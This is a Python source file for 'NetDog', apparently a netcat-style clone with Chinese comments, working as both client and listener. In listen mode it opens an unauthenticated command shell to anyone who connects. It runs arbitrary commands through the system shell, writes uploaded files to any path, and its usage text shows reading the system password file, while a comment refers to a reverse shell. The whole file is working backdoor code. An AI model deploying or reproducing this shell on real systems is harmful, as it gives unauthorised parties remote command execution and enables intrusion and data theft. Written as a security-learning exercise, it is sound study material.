import sys
import getopt
import subprocess
import chardet
from socket import *
from threading import *

listen = False
command = False
upload = False
target = ""
execute = ""
upload_destination = ""
port = 0


def usage():
    print("\n")
    print("[+++]The NetDog Tool's Usage:")
    print("")
    print("[*]-t --target= the target host")
    print("[*]-p --port= the target port")
    print("[*]-u --upload= upload_destination")
    print("[*]-e --execute= file_to_run")
    print("[*]-l --listen (listen on [host]:[port] for incoming connection.)")
    print("[*]-c --command (initialize a command shell.)")
    print("")
    print("[---]Examples:")
    print("[*]client:")
    print("\t netdog.py -t 127.0.0.1 -p 8888")
    print("\t echo \"ABCDEFG\" | ./netdog.py -t 192.168.0.1 -p 80")
    print("[*]service:")
    print("\t netdog.py -t 127.0.0.1 -p 8888 -l -c")
    print("\t netdog.py -t 127.0.0.1 -p 8888 -l -u \"./target.exe\"")
    print("\t netdog.py -t 127.0.0.1 -p 8888 -l -e \"cat /etc/password\"")
    sys.exit(0)


def opts_deal():
    global listen
    global command
    global upload
    global execute
    global target
    global upload_destination
    global port

    if not len(sys.argv[1:]):
        usage()
    # 读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute=", "target=",
                                    "port=", "command", "upload="])
    except getopt.GetoptError as error:
        print(str(error))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
            upload = True
        else:
            assert False, "Unhandled Option"


def client_sender(buffer):
    client = socket(AF_INET, SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):  # 语句 1
            buffer = buffer.encode("utf-8")
            client.send(buffer)
        while True:
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                # 判别数据的编码格式，原则上在数据发送端用什么编码，接收端就采用什么解码
                # 特需情况下，采用兼容且编码范围更大的编码格式
                encode_info = chardet.detect(data)
                response += data.decode(encode_info["encoding"], "ignore")
                if recv_len < 4096:
                    break
            print("From server[%s:%d]:\n---------------------------------\n%s\n" % (target, port, response))
            # 等待下一次输入
            buffer = input(">> ")
            # 输入exit 退出程序
            if buffer == "exit":
                print("[*] Exception Exiting!")
                break
            buffer = buffer.encode("utf-8")
            client.send(buffer)
        client.close()
    except:
        print("[*] Exception Exiting!")
        client.close()


def run_command(command):
    # 换行
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Fail to execute command.\r\n"
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if upload:
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            file_buffer += data.decode("utf-8")
            data_len = len(data)
            if data_len < 1024:
                break

        try:
            file_descriptor = open(upload_destination, "w")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send(b"Successfully saved the file!\n")
        except:
            client_socket.send(b"Failed to save the file!\n")

    if len(execute):
        output = run_command(execute)
        # print(type(output))    =>     output的数据类型为： <class"bytes">
        # import chardet
        # encode_info = chardet.detect(output)
        # print(encode_info["encoding"])   =>    output的编码格式为： GB2312
        # 由于数据类型为 bytes ,所以数据发送端，不存在编码。
        # 同时，在数据接收端应该遵循“用什么编码就用什么解码”的原则
        # 但是，请注意：往往有特殊情况，chardet检测结果并不准确。
        # 由于数据中可能存在其它非法字符
        # 当GB2312无法满足，我们需要采用兼容GD2312编码格式的其它编码格式进行解码
        # 编码范围：GB2312 < GBK < GB18030
        client_socket.send(output)

    if command:
        client_socket.send(b"successful connection.\n")
        while True:

            cmd_buffer = ""
            while True:
                cmd_data = client_socket.recv(1024)
                cmd_buffer += cmd_data.decode("utf-8")
                if len(cmd_data) < 1024:
                    break
            response = run_command(cmd_buffer)
            client_socket.send(response)
    client_socket.close()


def server_loop():
    global target
    if not len(target):
        target = "0.0.0.0"
    server = socket(AF_INET, SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        print("\nReceived incoming connection from %s:%s" % addr)
        client_thread = Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def main():
    # 指令信息录取
    opts_deal()

    # 作为客户端,进行标准收发数据、上传文件
    if not listen and len(target) and port > 0:
        # 如果客户端需先向服务端发送数据，则在命令行中读取内存数据，执行 语句 1
        # 如果客户端无需先向服务端，直接按ENTER 跳过 语句 1
        buffer = input(
            "\n[*]Tip: If you want to receive data from the server first, you should directly press ENTER here."
            "Otherwise input what you want to send to the server:\n>>")
        client_sender(buffer)

    # 作为服务端，接收文件
    # 执行命令、反弹shell
    if listen:
        server_loop()


if __name__ == '__main__':
    main()